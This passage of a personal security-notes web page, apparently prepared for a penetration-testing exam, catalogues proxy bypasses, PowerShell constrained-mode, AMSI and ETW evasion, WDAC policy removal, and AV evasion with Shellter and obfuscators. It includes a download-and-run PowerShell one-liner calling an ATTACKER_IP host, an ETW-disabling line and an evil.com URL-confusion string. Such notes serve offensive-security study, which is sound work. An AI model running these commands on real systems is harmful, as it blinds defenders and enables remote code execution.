+<pre><code class="language-powershell">netsh winhttp show proxy
+</code></pre>
+<p><strong>Linux Environment Variables</strong>:</p>
+<pre><code class="language-bash">env
+cat /etc/profile.d/proxy.conf
+</code></pre>
+<h3>PAC Proxy (Proxy Auto-Configuration)</h3>
+<p>PAC files contain JavaScript function <code>FindProxyForURL(url, host)</code>:</p>
+<pre><code class="language-javascript">function FindProxyForURL(url, host) {
+    if (dnsDomainIs(host, '.example.com')) {
+        return 'DIRECT';
+    }
+    return 'PROXY proxy.example.com:8080';
+}
+</code></pre>
+<p><strong>Tools</strong>:</p>
+<ul>
+<li><a href="https://portswigger.net/bappstore/7b3eae07aa724196ab85a8b64cd095d1">PortSwigger - Proxy Auto Config</a> - Automatically configures Burp upstream proxies</li>
+</ul>
+<h3>Common Bypass Techniques</h3>
+<p><strong>Try multiple access paths</strong>:</p>
+<ul>
+<li>IP address instead of domain</li>
+<li>Domains categorized as Health/Finance</li>
+</ul>
+<p><strong>Use another proxy</strong> reachable in the same environment</p>
+<p><strong>Weak regex exploitation</strong>:</p>
+<pre><code>user:pass@domain/endpoint?parameter#hash
+Example: microsoft.com:microsoft.com@microsoft.com.evil.com/microsoft.com?microsoft.com#microsoft.com
+</code></pre>
+<p><strong>Trusted Websites</strong> (<a href="https://lots-project.com/">Living Off Trusted Sites Project</a>):</p>
+<ul>
+<li>Amazon Cloud: AWS endpoints</li>
+<li>Microsoft Cloud: Azure endpoints</li>
+<li>Google Cloud: GCP endpoints</li>
+<li>live.sysinternals.com</li>
+</ul>
+<p><strong>User-Agents</strong>:</p>
+<pre><code>User-Agent: curl/8.11.0
+User-Agent: python-requests/2.32.3
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.2161
+</code></pre>
+<p><strong>Mobile User-Agents</strong>:</p>
+<pre><code>Mozilla/5.0 (Linux; Android 14; Pixel 9 Build/AD1A.240905.004; wv) AppleWebKit/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 18_0_1 like Mac OS X) AppleWebKit/605.1.15
+</code></pre>
+<p><strong>Domain Fronting</strong></p>
+<p><strong>Alternative Protocols</strong>:</p>
+<ul>
+<li>TCP</li>
+<li>WebSocket (HTTP)</li>
+<li>DNS Exfiltration</li>
+</ul>
+<hr />
+<h2 id="powershell-evasion">PowerShell Evasion</h2>
+<h3>Constrained Language Mode</h3>
+<p>Check if in constrained mode:</p>
+<pre><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<p><strong>Bypass using PowerShell v2</strong>:</p>
+<pre><code class="language-powershell">powershell.exe -version 2
+powershell.exe -version 2 -ExecutionPolicy bypass
+powershell.exe -v 2 -ep bypass -command &quot;IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')&quot;
+</code></pre>
+<p><strong>Bypass with <code>__PSLockDownPolicy</code></strong>:</p>
+<pre><code class="language-powershell">## Enable CLM from environment
+[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
+
+## Create script with System32 in path to bypass CLM
+## PS C:\&gt; C:\Users\Public\check-mode.ps1
+## Output: ConstrainedLanguage
+
+## PS C:\&gt; C:\Users\Public\System32\check-mode.ps1
+## Output: FullLanguage
+</code></pre>
+<p><strong>Bypass using COM</strong>:</p>
+<ul>
+<li><a href="https://gist.githubusercontent.com/xpn/1e9e879fab3e9ebfd236f5e4fdcfb7f1/raw/ceb39a9d5b0402f98e8d3d9723b0bd19a84ac23e/COM_to_registry.ps1">xpn/COM_to_registry.ps1</a></li>
+</ul>
+<p><strong>Bypass using custom PowerShell DLL</strong>:</p>
+<ul>
+<li><a href="https://github.com/p3nt4/PowerShdll">p3nt4/PowerShdll</a></li>
+<li><a href="https://github.com/iomoath/PowerShx">iomoath/PowerShx</a></li>
+</ul>
+<pre><code class="language-powershell">rundll32 PowerShdll,main &lt;script&gt;
+rundll32 PowerShx.dll,main -e &lt;PS script to run&gt;
+rundll32 PowerShx.dll,main -f &lt;path&gt; -c &lt;PS Cmdlet&gt;
+rundll32 PowerShx.dll,main -s  # Attempt to bypass AMSI
+</code></pre>
+<h3>Script Block and Module Logging</h3>
+<p><strong>Enable Script Block Logging</strong>:</p>
+<pre><code class="language-powershell">function Enable-PSScriptBlockLogging {
+    $basePath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
+    if(-not (Test-Path $basePath)) {
+        $null = New-Item $basePath -Force
+    }
+    Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value &quot;1&quot;
+}
+</code></pre>
+<p><strong>Disable ETW</strong> with <a href="https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32">tandasat/KillETW.ps1</a>:</p>
+<pre><code class="language-powershell">[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+</code></pre>
+<hr />
+<h2 id="windows-defender-application-control-wdac">Windows Defender Application Control (WDAC)</h2>
+<p>Also known as UMCI/Device Guard.</p>
+<p><strong>Get WDAC current mode</strong>:</p>
+<pre><code class="language-powershell">Get-ComputerInfo
+## DeviceGuardCodeIntegrityPolicyEnforcementStatus: EnforcementMode
+</code></pre>
+<p><strong>Remove WDAC policies</strong> (Windows 11 2022 Update):</p>
+<pre><code class="language-powershell">CiTool.exe -rp &quot;{PolicyId GUID}&quot; -json
+</code></pre>
+<p><strong>Policy locations</strong>:</p>
+<ul>
+<li>Active policies: <code>C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{PolicyId GUID}.cip</code></li>
+<li>Example policies: <code>C:\Windows\System32\CodeIntegrity\ExamplePolicies\</code></li>
+</ul>
+<p><strong>Tools</strong>:</p>
+<ul>
+<li><a href="https://github.com/mattifestation/WDACTools">mattifestation/WDACTools</a> - PowerShell module for WDAC management</li>
+<li><a href="https://github.com/bohops/UltimateWDACBypassList">bohops/UltimateWDACBypassList</a> - WDAC bypass techniques</li>
+<li><a href="https://github.com/nettitude/Aladdin">nettitude/Aladdin</a> - WDAC Bypass using AddInProcess.exe</li>
+</ul>
+<hr />
+<h2 id="av-evasion-shellter">AV Evasion -- Shellter</h2>
+<p><a href="https://www.shellterproject.com/">Shellter</a> injects payloads into legitimate 32-bit Windows PE files to bypass AV detection:</p>
+<pre><code class="language-bash">## Run Shellter and follow interactive prompts
+shellter
+## Select Auto or Manual mode
+## Point to a legitimate PE file (e.g., putty.exe)
+## Choose payload (built-in or custom)
+## Output: backdoored PE that evades static AV signatures
+</code></pre>
+<h2 id="powershell-obfuscation-invoke-obfuscation">PowerShell Obfuscation -- Invoke-Obfuscation</h2>
+<p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a> obfuscates PowerShell scripts and commands to bypass AV/AMSI:</p>
+<pre><code class="language-powershell">## Import and launch
+Import-Module ./Invoke-Obfuscation.psd1
+Invoke-Obfuscation
+## Follow interactive menu to select obfuscation layers
+## Supports TOKEN, STRING, ENCODING, COMPRESS, LAUNCHER techniques
+</code></pre>
+<h2 id="cross-compiling-exploits">Cross-Compiling Exploits</h2>
+<pre><code class="language-bash">## Install cross-compilers
+sudo apt-get install mingw-w64 gcc
+
+## Windows exploit (32-bit)
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
+
+## Linux exploit
+gcc -pthread exploit.c -o exploit -lcrypt
+</code></pre>
+<h2 id="av-detection-methods-background">AV Detection Methods — Background</h2>
+<p>AV software typically layers <strong>three</strong> detection methods:</p>
+<ol>
+<li><strong>Signature-based</strong> — a unique byte sequence identifying known malware. Bypass by modifying the payload's byte sequence (encoding/packing) so it no longer matches.</li>
+<li><strong>Heuristic-based</strong> — rule/decision-based detection looking for suspicious patterns in code structure or API call sequences.</li>
+<li><strong>Behavior-based</strong> — monitors runtime behavior rather than static bytes (used against newer malware strains). <strong>The hardest to evade</strong> — it watches what the program <em>does</em>, not what it <em>looks like</em>.</li>
+</ol>
+<hr />
+<h2 id="on-disk-evasion-techniques">On-Disk Evasion Techniques</h2>
+<ul>
+<li><strong>Obfuscation</strong> — reorganizes code to make it harder to analyze/reverse-engineer without changing its function.</li>
+<li><strong>Encoding</strong> — reversible transformation into a new format (e.g. <code>msfvenom -e x86/shikata_ga_nai</code>); encoded → decoded back to original at runtime.</li>
+<li><strong>Packing</strong> — repackages the executable with a new binary structure/smaller size, giving it a new signature.</li>
+<li><strong>Crypters</strong> — encrypt the payload/code; decrypt in memory at runtime. The decryption key/function usually lives in a small unencrypted "stub" that does the unwrapping.</li>
+</ul>
+<p><strong>Named packers</strong> (compress EXE + embed unpack-at-runtime stub, changing bytes-on-disk): UPX, MPRESS, MEW, Morphine, Themida, Enigma, Alternate EXE Packer, ExeStealth.</p>
+<p><strong>Tools:</strong></p>
+<ul>
+<li><a href="https://www.shellterproject.com/">Shellter</a> — inject payloads into legitimate Windows PEs</li>
+<li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a> — PowerShell v2.0+ compatible command/script obfuscator</li>
+</ul>
+<hr />
+<h2 id="in-memory-evasion-fileless">In-Memory Evasion (Fileless)</h2>
+<p>Focuses on manipulating memory directly rather than writing files to disk — injects the payload into a running process by leveraging Windows APIs, then executes it in memory on a separate thread. Never touches disk, so static/signature scanners never see it; primarily defeated by behavior-based/EDR detection instead.</p>
+<p><strong>Why modern AV/EDR still catches packed/encoded payloads:</strong></p>
+<ul>
+<li><strong>Encoders ≠ invisibility</strong> — <code>shikata_ga_nai</code> and friends only strip bad chars / change on-disk bytes; behavior + ML + memory telemetry still flag the payload at runtime.</li>
+<li><strong>Encryption ≠ stealth</strong> — TLS/AES hides <em>content</em>, not <em>metadata</em> (destinations, timing, SNI, JA3/JA4 fingerprints, beacon cadence).</li>
+<li><strong>Packed binaries leave loud signals</strong> — abnormal section names (<code>UPX0</code>/<code>UPX1</code>), very high per-section entropy, tiny import tables, and runtime <code>VirtualAlloc</code>→write→<code>CreateThread</code> with <strong>RWX</strong> memory transitions.</li>
+<li><strong>"Slower" isn't always safer</strong> — low-and-slow scans/beacons can trip anomaly detectors that model normal behavior.</li>
+</ul>
+<p><strong>Practical exam-day takeaway:</strong> don't rely on <code>-e</code> / <code>-i</code> encoding to beat modern Defender. Pair a template-injection (<code>msfvenom -x -k</code>) or Shellter with a genuinely different delivery (fileless PowerShell + AMSI bypass), and prefer a stageless payload over a staged one behind egress filtering. Encoding buys signature evasion only.</p>
+<hr />
+<h2 id="exploit-coding-shellcode-notes">Exploit-Coding / Shellcode Notes</h2>
+<p><strong>IDS/IPS signature on repeated buffer patterns and huge <code>0x90</code> NOP sleds</strong> — vary filler bytes / use mixed sleds to reduce signature hits (still behaviorally detectable).</p>
+<p><strong>Make targets explicit in MSF modules</strong> so return address + offset are auditable:</p>
+<pre><code class="language-ruby">'Targets' =&gt; [ [ 'Windows 2000 SP4 English', { 'Ret' =&gt; 0x77e14c29, 'Offset' =&gt; 5093 } ] ],
+</code></pre>
+<p><strong>Always validate a crafted exploit in a sandbox VM first</strong> — you often get one shot against a real target.</p>
+<hr />
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://theepicpowner.gitlab.io/posts/Flying-Under-the-Radar-Part-1/">Flying Under the Radar: Part 1 - theepicpowner - April 24, 2024</a></li>
+<li><a href="https://beierle.win/2024-12-20-Weaponizing-WDAC-Killing-the-Dreams-of-EDR/">Weaponizing WDAC: Killing the Dreams of EDR - Jonathan Beierle and Logan Goins - December 20, 2024</a></li>
+<li><a href="https://www.elastic.co/security-labs/the-elastic-container-project">The Elastic Container Project for Security Research - Andrew Pease et al. - March 1, 2023</a></li>
+<li><a href="https://specterops.io/blog/2025/10/23/catching-credential-guard-off-guard/">Catching Credential Guard Off Guard - Valdemar Carøe - October 23, 2025</a></li>
+<li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a></li>
+<li><a href="https://www.shellterproject.com/">Shellter</a></li>
+</ul>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — other / evasion & bypass · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="other.html">other</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
